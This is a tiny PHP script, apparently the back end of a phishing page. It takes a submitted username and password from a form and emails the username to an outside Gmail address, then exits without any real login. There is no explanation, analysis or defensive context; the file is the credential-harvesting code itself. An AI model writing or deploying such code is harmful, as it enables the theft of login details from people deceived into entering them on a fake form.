<?php 
$user=$_POST['user'];
$pass=$_POST['pass'];

mail('abokasban@gmail.com', 'My Subject', $user);
exit();
?>